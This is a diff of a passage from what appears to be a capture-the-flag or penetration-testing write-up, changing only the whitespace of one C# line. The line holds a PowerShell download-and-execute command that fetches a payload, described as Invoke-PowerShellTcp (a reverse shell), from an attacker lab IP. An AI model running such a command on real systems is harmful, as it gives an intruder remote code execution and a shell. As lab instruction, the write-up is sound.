@@ -283,7 +283,7 @@ This repo from MinatoTW was very helpful:
 Within the code, I changed the command executed to download Invoke-PowerShellTcp from our machine.
 
 ```csharp
- String exec = "iex(new-object net.webclient).downloadstring('http://10.10.14.29/payload')";  // Modify for custom commands
+String exec = "iex(new-object net.webclient).downloadstring('http://10.10.14.29/payload')";  // Modify for custom commands
 ```
 
 Then, we can compile it using `csc.exe` within our Windows machine.
